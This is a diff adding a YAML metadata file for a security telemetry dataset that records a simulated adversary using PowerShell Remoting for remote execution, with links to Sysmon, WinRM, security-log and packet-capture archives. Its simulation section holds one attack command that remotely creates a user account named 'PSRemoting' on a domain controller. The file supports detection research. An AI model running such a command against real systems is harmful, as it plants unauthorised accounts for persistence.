@@ -1,0 +1,57 @@
+id: 190518-RemoteExecution-PSRemoting
+title: Remote Execution via PSRemoting
+description: This dataset represents adversaries executing malicious code on remote hosts using PowerShell Remoting (WinRM).
+
+collaborators:
+  - Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/05/18
+modification_date: 2022/09/22
+platform:
+  - Windows
+type: atomic
+tags:
+  - PowerShell Remoting
+
+attack_mappings:
+  - technique: T1021
+    sub-technique: "006"
+    tactics:
+      - TA0002
+      - TA0008
+
+datasets:
+  endpoint:
+    - log_source: Microsoft-Windows-Sysmon
+      size: 1.43 MB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190518-RemoteExecution-PSRemoting/DC01_Windows_MicrosoftWindowsSysmonOperational.zip
+    - log_source: Microsoft-Windows-WinRM
+      size: 754.00 B
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190518-RemoteExecution-PSRemoting/DC01_Windows_MicrosoftWindowsWinRMOperational.zip
+    - log_source: Microsoft-Windows-Security-Auditing
+      size: 678.30 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190518-RemoteExecution-PSRemoting/DC01_Windows_Security.zip
+    - log_source: Microsoft-Windows-Sysmon
+      size: 286.67 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190518-RemoteExecution-PSRemoting/WORKSTATION6_Windows_MicrosoftWindowsSysmonOperational.zip
+    - log_source: Microsoft-Windows-WinRM
+      size: 13.83 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190518-RemoteExecution-PSRemoting/WORKSTATION6_Windows_MicrosoftWindowsWinRMOperational.zip
+    - log_source: Microsoft-Windows-Security-Auditing
+      size: 73.40 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190518-RemoteExecution-PSRemoting/WORKSTATION6_Windows_Security.zip
+  network:
+    - log_source: Wireshark
+      size: 123.36 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190518-RemoteExecution-PSRemoting/WORKSTATION5_Windows_PCAP.zip
+    - log_source: Wireshark
+      size: 148.04 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190518-RemoteExecution-PSRemoting/WORKSTATION6_Windows_PCAP.zip
+
+simulation:
+  executor: PowerShell
+  scriptUri:
+  supportingFileUris:
+  commands: |-
+    Invoke-Command -ScriptBlock { net.exe user PSRemoting Fall2022 /add } -ComputerName DC01.mssentinel.local
+  output: |-
+    The command completed successfully.
